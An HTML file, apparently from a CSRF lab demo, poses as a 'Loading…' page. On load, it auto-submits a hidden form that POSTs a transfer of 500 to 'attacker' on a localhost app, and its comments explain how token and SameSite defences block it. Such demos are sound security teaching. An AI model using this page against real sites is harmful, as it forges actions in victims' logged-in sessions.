<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Loading…</title>
  <style>
    * { box-sizing: border-box; margin: 0; padding: 0; }
    body {
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      min-height: 100vh;
      display: flex; justify-content: center; align-items: center;
      background: #0f172a; color: #e2e8f0;
    }
    .spinner {
      width: 48px; height: 48px;
      border: 5px solid #334155;
      border-top-color: #38bdf8;
      border-radius: 50%;
      animation: spin 0.8s linear infinite;
      margin-bottom: 16px;
    }
    @keyframes spin { to { transform: rotate(360deg); } }
    .card { text-align: center; }
    p { color: #94a3b8; margin-top: 8px; font-size: .85rem; }
  </style>
</head>
<body>

  <div class="card">
    <div class="spinner" style="margin:0 auto 16px;"></div>
    <h2>Loading your content…</h2>
    <p>Please wait a moment.</p>
  </div>

  <!-- =============================================================
       CSRF ATTACK – POST-based exploit
       A hidden form auto-submits a POST request to /transfer on
       the victim app.  In SECURE mode this will be blocked because
       the request lacks a valid _csrf synchronizer token (and the
       SameSite=strict cookie won't even be sent cross-site).
       ============================================================= -->
  <form id="csrf-form"
        method="POST"
        action="http://localhost:3000/transfer"
        style="display:none;">
    <input type="hidden" name="to"     value="attacker">
    <input type="hidden" name="amount" value="500">
    <!-- No _csrf token – the attacker cannot know it -->
  </form>

  <script>
    // Auto-submit the hidden form as soon as the page loads
    document.getElementById('csrf-form').submit();
  </script>

</body>
</html>
